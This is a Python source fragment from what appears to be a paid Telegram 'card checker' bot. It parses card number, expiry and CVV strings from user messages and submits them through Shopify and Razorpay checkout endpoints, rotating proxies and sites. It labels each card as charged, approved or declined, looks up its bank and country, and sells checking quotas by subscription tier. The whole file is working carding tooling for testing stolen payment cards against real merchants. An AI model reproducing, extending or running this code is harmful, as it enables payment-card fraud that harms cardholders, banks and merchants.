        'closed for maintenance',
        'under maintenance',
        'shop is frozen',
        'store is frozen',
        'shop has been frozen',
        'delivery_no_delivery_strategy',
        'delivery_strategy_conditions',
        'delivery_strategy_conditions_1',
        'no shipping methods available',
        'delivery not available',
        'delivery_company_required',
        'delivery_address_required',
        'cannot ship to this address',
        'delivery_delivery_line_detail_changed',
        'delivery_address2_required',
        'delivery_line_detail_changed',
        'delivery_line',
        'delivery_address',
        'address_required',
        'submit_rejected',
        'shipping method not available',
        'site error! status: 400', 'site error! status: 401', 'site error! status: 403',
        'site error! status: 404', 'site error! status: 408', 'site error! status: 429',
        'site error! status: 500', 'site error! status: 501', 'site error! status: 502',
        'site error! status: 503', 'site error! status: 504', 'site error! status: 505',
        'site error! status: 520', 'site error! status: 521', 'site error! status: 522',
        'site error! status: 523', 'site error! status: 524', 'site error! status: 525',
        'site error! status: 526', 'site error! status: 527', 'site error! status: 530',
        'http 400', 'http 401', 'http 403', 'http 404', 'http 408', 'http 429',
        'http 500', 'http 502', 'http 503', 'http 504', 'http 520', 'http 521',
        'http 522', 'http 523', 'http 524', 'http 525', 'bad gateway',
        'service unavailable', 'gateway timeout', 'internal server error',
        'connection refused', 'connection closed', 'connection reset by peer',
        'connection aborted', 'connection timeout', 'connection timed out',
        'network is unreachable', 'host is unreachable', 'no route to host',
        'connection error', 'connection failed', 'timed out', 'timeout',
        'could not resolve host', 'connect tunnel failed', 'unreachable',
        'network error', 'connection reset', 'empty reply from server', 'api_timeout',
        'tlsv1 alert', 'ssl routines', 'openssl ssl_connect',
        'ssl certificate error', 'ssl handshake failed', 'ssl error',
        'tls connection failed', 'certificate verify failed',
        'self signed certificate', 'expired certificate',
        'remote host closed connection', 'broken pipe',
        'dns lookup failed', 'dns resolution failed', 'dns error',
        'cannot resolve host', 'hostname not found', 'name resolution failed',
        'getaddrinfo failed', 'dns server not responding',
        'rate limit exceeded', 'too many requests', 'request was throttled',
        'detected unusual activity', 'bot protection enabled', 'captcha required',
        'cloudflare', 'access denied', 'blocked by cloudflare', 'ddos protection',
        'just a moment', 'ray id:', 'cf-ray:',
        'invalid json', 'json decode error', 'json parse error',
        'site error', 'site dead', 'server error', 'internal_server_error',
        'unexpected error', 'something went wrong',
        'nonetype', 'unknown error',
        'unable to process', 'payment provider error', 'payment gateway error',
        'checkout_expired', 'receipt_empty', 'receipt id is empty',
        'site requires login', 'failed to get checkout',
        'error processing card', 'decision_rule_block', 'validation_custom',
        'invalid_payment_method',
    ]
    
    for ind in dead_indicators:
        if ind in lower:
            return True
    
    if not response or response.strip() == '':
        return True
    
    try:
        price_str = str(price).replace('$', '').strip()
        pv = float(price_str) if price_str and price_str != '-' else 0
    except:
        pv = 0
    
    if pv == 0:
        normal_declines = ['card_declined', 'insufficient_funds', 'do_not_honor', 
                          'expired_card', 'otp_required', 'cvc', 'generic_decline']
        if not any(nd in lower for nd in normal_declines):
            return True
    
    return False


def is_truly_alive(response, price):
    if not response:
        return False
    lower = response.lower().strip()
    
    if is_site_truly_dead(response, price):
        return False
    
    pc = str(price).replace('$', '').strip() if price else '0'
    try:
        pv = float(pc)
    except:
        pv = 0.0
    
    alive_keywords = [
        'charged', 'approved', 'order_paid', 'order_placed', 
        'order_confirmed', 'payment successful', 'payment success',
        'transaction success', 'thank you for your order',
        'order received', 'order created', 'order confirmed'
    ]
    if any(k in lower for k in alive_keywords):
        return True
    
    normal_declines = [
        'card_declined', 'card declined', 'generic_decline', 'generic decline',
        'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
        'stolen_card', 'stolen card', 'lost_card', 'lost card', 'expired_card',
        'expired card', 'otp_required', 'otp required', 'cvc', 'ccn',
        'ccn live cvv', '3d_authentication', '3ds_required', 'authentication_required',
        'restricted_card', 'restricted card', 'fraudulent', 'fraud suspected',
        'transaction_not_allowed', 'not permitted', 'card_not_supported',
        'card not supported', 'currency_not_supported', 'duplicate_transaction',
        'pickup_card', 'pick up card', 'revocation_of_authorization',
        'no_action_taken', 'avs_check_failed', 'incorrect number',
        'incorrect_number', 'invalid_number'
    ]
    if any(nd in lower for nd in normal_declines):
        return True
    
    if pv == 0.0:
        return False
    
    return True


# ====================== URL NORMALIZATION ======================
def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


# ====================== MESSAGE SYSTEM ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except asyncio.TimeoutError:
        return None
    except:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False),
                timeout=10
            )
        except:
            return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except:
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(
            msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False),
            timeout=8
        )
    except:
        pass


def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")


# ====================== CARD FORMATTING ======================
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


def format_card_result_no_price(status, card, gateway, response, bin_info=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>""", he


def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


def format_rz_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Tyrant_Xd_Rebot'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


# ====================== FORCE JOIN ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600:
        return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned):
                return False
        except UserNotParticipantError:
            return False
        except (ChatAdminRequiredError, ChannelPrivateError):
            pass
        except:
            pass
    _JOIN_CACHE[user_id] = now
    return True


async def force_join_check(event):
    return True


# ====================== MAINTENANCE ======================
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except:
        pass


async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except:
        return False


async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False


# ====================== ACCESS ======================
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"


async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan


def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID:
        return 10000
    
    p = plan.title() if plan else "Bronze"
    
    if p == "X":
        return 10000
    elif p == "Root":
        return 5000
    elif p == "Elite":
        return 2500
    elif p == "Core":
        return 1500
    elif p == "Trial":
        return 500
    else:
        return 0


def is_paid_plan(plan):
    return plan.title() in PAID_TIERS if plan else False


async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Group Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Free users')} → {bs('group only')}</b>
{PE} <i>{bs('Upgrade for private access')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])


async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Tyrant_Xd_Rebot")]], emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])


def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]


# ====================== UTILITIES ======================
def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))


def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm)
                result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and is_valid_url_or_domain(norm) and norm not in seen:
                seen.add(norm)
                result.append(norm)
    return result


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: 
        pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: 
            h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else: 
        return None
    if not h or not p: 
        return None
    try:
        if not (0 < int(p) <= 65535): 
            return None
    except: 
        return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}


async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: 
                return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e:
        return False, str(e)


async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200:
                    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                d = await r.json(content_type=None)
                return {"brand": d.get('brand', '-'), "type": d.get('type', '-'), "level": d.get('level', '-'), "bank": d.get('bank', '-'), "country": d.get('country_name', '-'), "flag": d.get('country_flag', '🏳️')}
    except:
        return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}


# ====================== SHOPIFY API ======================
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): 
        site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url


def classify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED': 
        ar = '3DS_REQUIRED'
    st = rj.get('Status', False)
    price = rj.get('Price', '-')
    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
    if price is not None and price != '-': 
        price = f"${price}"
    rl = ar.lower()
    
    if is_site_error(ar) or is_proxy_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    
    charged = [
        'order_paid', 'order_placed', 'order_confirmed', 'thank you', 
        'payment successful', 'order_completed', 'charged', 'order_created',
        'order confirmed', 'transaction success', 'payment success',
        'receipt', 'invoice', 'successfully charged'
    ]
    
    approved = [
        'otp_required', 'otp required', '3d_authentication', '3ds_required',
        '3d required', '3d_redirect', 'authentication_required',
        'insufficient_funds', 'insufficient funds', 'cvc', 'ccn', 'ccn live cvv'
    ]
    
    declined = [
        'generic_decline', 'generic decline', 'do_not_honor', 'do not honor',
        'stolen_card', 'lost_card', 'pickup_card', 'pick_up_card',
        'restricted_card', 'restricted card', 'fraudulent', 'fraud suspected',
        'fraud_suspected', 'expired_card', 'expired card',
        'transaction_not_allowed', 'transaction not allowed', 'card_declined',
        'card declined', 'processor_declined', 'processor declined',
        'card_not_supported', 'card not supported', 'currency_not_supported',
        'duplicate_transaction', 'revocation_of_authorization',
        'no_action_taken', 'try_again_later', 'not_permitted', 'decline',
        'your card was declined', 'payment_intent_authentication_failure',
        'avs_check_failed', 'incorrect number', 'incorrect_number',
        'invalid', 'invalid_number', 'decision_rule_block', 'generic_error',
        'payment failed', 'failed', 'cancelled', 'payment cancelled'
    ]
    
    if any(k in rl for k in charged):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    if any(k in rl for k in approved):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    if any(k in rl for k in declined):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    
    if st is True and not any(w in rl for w in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud"]):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}


async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
            try: 
                rj = await r.json(content_type=None)
            except: 
                return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
        result = classify_response(rj)
        result["card"] = card
        result["site"] = site
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        err = str(e)
        st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Unknown", "Status": st2, "card": card, "site": site}


async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    """Updated with smart retry - retries same card for temporary errors up to 3 times"""
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    
    tried_sites = set()
    tried_proxies = set()
    last = None
    site_attempt = 0
    
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        
        if rotator: 
            site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        tried_sites.add(site)
        site_attempt += 1
        
        proxy_data = None
        if proxies_data:
            if rotator: 
                proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data: 
                tried_proxies.add(proxy_data.get('proxy_url'))
        
        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        
        # Check if this is a retry-able error (temporary)
        resp_text = result.get("Response", "")
        is_retryable = is_card_retry_needed(resp_text)
        is_site_err = result.get("Status") == "SiteError"
        
        # If not SiteError and not retryable -> permanent result
        if not is_site_err and not is_retryable:
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data:
                    rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, site_attempt
        
        # If SiteError or retryable error, log and retry
        if is_site_err:
            if rotator:
                rotator.report_site_fail(site)
                if proxy_data and is_proxy_error(resp_text):
                    rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        
        last = result
        
        # If it's not retryable but SiteError, don't waste retries on same card
        if is_site_err and not is_retryable:
            # This is a permanent site error, return as is
            return result, site_attempt
        
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    
    if last:
        # After max retries, if still getting retryable errors, mark as Error
        if is_card_retry_needed(last.get("Response", "")):
            last["Status"] = "Error"
        return last, -1
    
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1


async def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url) as resp:
            if resp.status != 200: 
                return {'site': site, 'status': 'dead', 'price': '-', 'gateway': '-', 'response': f'HTTP_{resp.status}'}
            try: 
                raw = await resp.json(content_type=None)
            except: 
                return {'site': site, 'status': 'dead', 'price': '-', 'gateway': '-', 'response': 'Invalid JSON'}
        
        rm = raw.get('Response', '')
        price = raw.get('Price', '-')
        gateway = raw.get('Gate', raw.get('Gateway', 'Shopify'))
        if price and price != '-': 
            price = f"${price}"
        
        if is_site_error(rm.lower()) or is_site_truly_dead(rm, price):
            return {'site': site, 'status': 'dead', 'price': price, 'gateway': gateway, 'response': rm}
        if not is_truly_alive(rm, price): 
            return {'site': site, 'status': 'dead', 'price': price, 'gateway': gateway, 'response': rm}
        return {'site': site, 'status': 'alive', 'price': price, 'gateway': gateway, 'response': rm}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'gateway': '-', 'response': str(e)[:50]}


# ====================== RAZORPAY API (FIXED) ======================
def build_rz_api_url(cc, proxy_data=None, site=None):
    # If no site provided, use default from example (can be changed by admin if needed)
    if not site:
        site = "https://razorpay.me/@tpstech"
    url = f'{RAZORPAY_API_URL}?cc={quote(cc, safe="")}&site={quote(site, safe="")}'
    if proxy_data:
        un = proxy_data.get('username') or ''
        pw = proxy_data.get('password') or ''
        ip = proxy_data['ip']
        port = proxy_data['port']
        ps = f"{un}:{pw}@{ip}:{port}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url

def clean_rz_response(raw_resp):
    if not raw_resp:
        return "No response from API"
    # Remove common prefixes like "DEAD | ID: pay_xxx | " etc.
    cleaned = re.sub(r'^(?:DEAD|LIVE|SUCCESS|CHARGED|APPROVED|DECLINED)\s*\|\s*ID:\s*pay_[a-zA-Z0-9]+\s*\|\s*', '', raw_resp, flags=re.IGNORECASE).strip()
    # If after cleaning it's empty, return original truncated
    if not cleaned:
        return raw_resp[:100]
    return cleaned

def classify_rz_response(rj, raw_text=None):
    gate = 'RazorPay'
    # First try to get response from JSON, else use raw_text
    resp = ""
    if isinstance(rj, dict):
        resp = str(rj.get('response', rj.get('Response', '')))
    if not resp and raw_text:
        resp = raw_text
    resp = clean_rz_response(resp)
    rl = resp.lower()

    if is_rz_retry_error(resp):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "RetryError"}

    rz_charged = [
        'transaction success', 'payment successful', 'payment success',
        'order_paid', 'charged', 'success', 'captured', 'authorized',
        'payment captured', 'payment authorized', 'money received', 'live'
    ]
    
    rz_approved = [
        'your payment could not be completed due to insufficient account balance',
        'insufficient account balance', 'insufficient_funds', 'insufficient funds',
        'otp_required', 'otp required', '3d_authentication', '3ds_required',
        'authentication_required', 'cvc', 'ccn', 'please authenticate',
        'additional authentication required', 'bank authentication required'
    ]
    
    rz_declined = [
        'your payment has been cancelled', 'payment cancelled', 'cancelled',
        'card_declined', 'card declined', 'generic_decline', 'generic decline',
        'do_not_honor', 'do not honor', 'stolen_card', 'lost_card',
        'expired_card', 'expired card', 'restricted_card', 'fraudulent',
        'not_permitted', 'transaction_not_allowed', 'card_not_supported',
        'decline', 'your card was declined', 'payment failed', 'failed',
        'generic_error', 'invalid card', 'invalid_card', 'card error',
        'payment error', 'transaction declined', 'bank declined', 'dead'
    ]

    if any(k in rl for k in rz_charged):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Charged"}
    if any(k in rl for k in rz_approved):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Approved"}
    if any(k in rl for k in rz_declined):
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}
    
    # If no keywords matched but response is not empty, assume Declined
    if resp and resp != "No response from API":
        return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}
    
    return {"Response": "Empty or invalid response", "Price": "-", "Gateway": gate, "Status": "Error"}

async def check_rz_api(card, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        site = "https://razorpay.me/@tpstech"   # default site, can be overridden by admin via env later
        url = build_rz_api_url(card, proxy_data, site)
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.get(url) as r:
            # Try to parse JSON first, if fails, read as text
            try:
                rj = await r.json(content_type=None)
                raw_text = None
            except:
                rj = {}
                raw_text = await r.text()
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
        result = classify_rz_response(rj, raw_text)
        result["card"] = card
        return result
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": str(e)[:100], "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}

